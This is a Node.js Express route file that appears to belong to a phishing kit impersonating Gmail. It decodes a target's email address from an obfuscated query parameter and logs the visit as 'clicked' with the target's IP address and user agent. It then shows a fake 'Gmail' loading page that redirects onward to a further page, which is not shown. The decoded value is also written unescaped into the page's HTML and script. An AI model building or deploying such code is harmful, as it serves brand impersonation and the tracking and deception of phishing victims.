
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));

//const fetch = require('node-fetch');



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {
    const data = req.query.ffregretgreytusnsxbsahdbaxuisadbasbba;
    
    if (data == null) {
        res.render('error');
    } else {
        const userid = Buffer.from(data, 'base64').toString('utf-8');
        const word = 'clicked';

        // Get the client IP, handle undefined or null
        const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        // Check if clientIP is defined and not null
        let ip = '';
        if (clientIP) {
            ip = clientIP.split(',')[0].trim();
        } else {
            console.error('Client IP is undefined or null');
            ip = 'unknown';
        }

        const useragent = req.get('User-Agent');
        const date = new Date();
        const pagetype = 0;
        const mobiletype = 0;
        const notify = 2;

        // Do your further processing...
    

const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
  db.query(sqlQuery, [userid], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

  if (rowCount > 0) {

                const updateQuery = 'UPDATE maintable SET password = ?, pagetype = ?, mobiletype = ?, notify = ? WHERE username = ?';
                db.query(updateQuery, [word, pagetype, mobiletype, notify, userid], (err) => {
                    if (err) {
                        console.error('Error inserting record:', err);
                        return res.status(500).send('Internal Server Error');
                    }
                

                    });


        }else{

            const insertQuery = 'INSERT INTO maintable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        }

   
    const url = `/home/?wihdft948fdjxgjdferuidd=${data}`;

   

    const htmlContent = `
        <!doctype html>
  <html lang="en">
  <head>   
  
      <!-- Required meta tags -->
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Gmail</title>
      <link rel="shortcut icon" href="/images/gmail.ico" type="image/x-icon">
      <style>
      :root {
        --yellow: #feb60a;
        --red: #ff0062;
        --blue: #00dbf9;
        --violet: #da00f7;
        }
        body {
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: white;
        }
        div.container {
        display: flex;
        justify-content: center;
        align-items: center;
        }
        div > div {
        width: 3vw;
        height: 3vw;
        border-radius: 100%;
        margin: 2vw;
        background-image: linear-gradient(145deg, rgba(255,255,255,0.5) 0%, rgba(0,0,0,0) 100%);
        animation: bounce 1.5s 0.5s linear infinite;
        }
        .yellow {
        background-color: var(--yellow);
        }

        .red {
        background-color: var(--red);
        animation-delay: 0.1s;
        }

        .blue {
        background-color: var(--blue);
        animation-delay: 0.2s;
        }

        .violet {
        background-color: var(--violet);
        animation-delay: 0.3s;
        }

        @keyframes bounce {
        0%, 50%, 100% {
        transform: scale(1);
        filter: blur(0px);
        }
        25% {
        transform: scale(0.6);
        filter: blur(3px);
        }
        75% {
        filter: blur(3px);
        transform: scale(1.4);
        }
        }
        </style>
        </head>
        <body>
     
        <input type='hidden' name="username" id="username" value="${userid}">
        <center><object data="/2.gif" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:75vw; height:75vh; object-fit:contain;"></object></center>
        <script>setTimeout(() => { window.location.href = '${url}'; }, 6000);</script>

    </body>
  </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            
});
}
});

module.exports =router
